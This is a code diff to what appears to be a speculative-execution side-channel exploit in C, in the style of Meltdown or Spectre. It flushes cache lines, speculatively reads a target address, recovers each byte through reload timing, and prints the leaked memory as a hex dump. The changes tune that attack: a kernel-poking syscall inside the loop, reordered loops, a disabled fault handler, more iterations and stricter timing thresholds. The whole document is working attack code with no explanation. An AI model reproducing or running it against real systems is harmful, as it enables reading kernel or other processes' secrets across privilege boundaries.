@@ -218,9 +218,15 @@ void free_channel(channel *ch)
 #endif
 }
 
-char test_one = 1;
+void poke_kernel()
+{
+	syscall(0, -1, 0, 0);
+}
 
-#define ITERATIONS 500
+char test_one = 1;
+int dump = 0;
+
+#define ITERATIONS 2000
 
 #define TIME_DIVS 50
 #define TIME_BUCKET 8
@@ -236,21 +242,21 @@ void collect_stats(channel *ch, void *addr)
 	ch->pointers[POISON_LEN] = addr;
 #endif
 	
-	for(int i = 0; i < ITERATIONS * 10; i++)
+	for(int line = 0; line < 256; line++)
 	{
-		for(int line = 0; line < 256; line++)
+		for(int i = 0; i < ITERATIONS; i++)
+		{
 			clflush(ch->mapping[line]);
 
+			poke_kernel();
 #ifdef POISON
-		clflush(&ch->isspec[POISON_LEN]);
-		poison_speculate(ch->pointers, ch->isspec, ch->mapping);
+			clflush(&ch->isspec[POISON_LEN]);
+			poison_speculate(ch->pointers, ch->isspec, ch->mapping);
 #else
-		if(!setjmp(restore))
+			//if(!setjmp(restore))
 			stall_speculate(addr, ch->mapping);
 #endif
 		
-		for(int line = 0; line < 256; line++)
-		{
 			unsigned long long t = time_read(ch->mapping[line]);
 			if(t / TIME_BUCKET < TIME_DIVS)
 				timing[line][t / TIME_BUCKET]++;
@@ -284,12 +290,12 @@ int calculate_cutoff(channel *ch)
 #else
 	collect_stats(ch, NULL);
 	int med_miss = median(timing[1], TIME_DIVS) * TIME_BUCKET;
-	cutoff_time = med_miss * 2 / 3;
+	cutoff_time = med_miss / 2;
 #endif
 }
 
-#define PROB_HIT_ACCIDENTAL 0.85
-#define PROB_HIT_FAILS 0.99
+#define PROB_HIT_ACCIDENTAL 0.0005
+#define PROB_HIT_FAILS 0.9995
 int hit_timing[256];
 int miss_timing[256];
 int run_timing_once(channel *ch, void *addr, double *uncertainty)
@@ -301,20 +307,21 @@ int run_timing_once(channel *ch, void *addr, double *uncertainty)
 	ch->pointers[POISON_LEN] = addr;
 #endif
 	
-	for(int i = 0; i < ITERATIONS; i++)
+	for(int line = 0; line < 256; line++)
 	{
-		for(int line = 0; line < 256; line++)
+		for(int i = 0; i < ITERATIONS; i++)
+		{
 			clflush(ch->mapping[line]);
+
+			poke_kernel();
 #ifdef POISON
-		clflush(&ch->isspec[POISON_LEN]);
-		poison_speculate(ch->pointers, ch->isspec, ch->mapping);
+			clflush(&ch->isspec[POISON_LEN]);
+			poison_speculate(ch->pointers, ch->isspec, ch->mapping);
 #else
-		if(!setjmp(restore))
+			//if(!setjmp(restore))
 			stall_speculate(addr, ch->mapping);
 #endif
 		
-		for(int line = 0; line < 256; line++)
-		{
 			unsigned long long t = time_read(ch->mapping[line]);
 			(t < cutoff_time ? hit_timing : miss_timing)[line]++;
 		}
@@ -425,12 +432,12 @@ int main(int argc, char *argv[])
 		printf("%p | ", addr + ln * 16);
 		for(int p = 0; p < 16; p++)
 		{
-			int val = read_byte(&ch, addr + ln * 16 + p);
+			int val = read_byte(&ch, addr + ln * 16 + p, 1);
 			if(val == -1)
 				printf("?? ");
 			else
 				printf("%02x ", val);
-			fflush(NULL);
+			fflush(stdout);
 		}
 		printf("\n");
 	}
